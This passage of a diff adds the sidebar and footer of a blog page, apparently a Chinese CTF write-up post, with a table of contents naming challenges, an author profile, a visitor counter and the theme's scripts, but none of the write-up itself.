+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Flaskmetal-Alchemist"><span class="nav-number">1.</span> <span class="nav-text">Flaskmetal Alchemist</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hacker-Ts"><span class="nav-number">2.</span> <span class="nav-text">Hacker Ts</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Deafcon"><span class="nav-number">3.</span> <span class="nav-text">Deafcon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Poller"><span class="nav-number">4.</span> <span class="nav-text">Poller</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Two-For-One"><span class="nav-number">5.</span> <span class="nav-text">Two For One</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
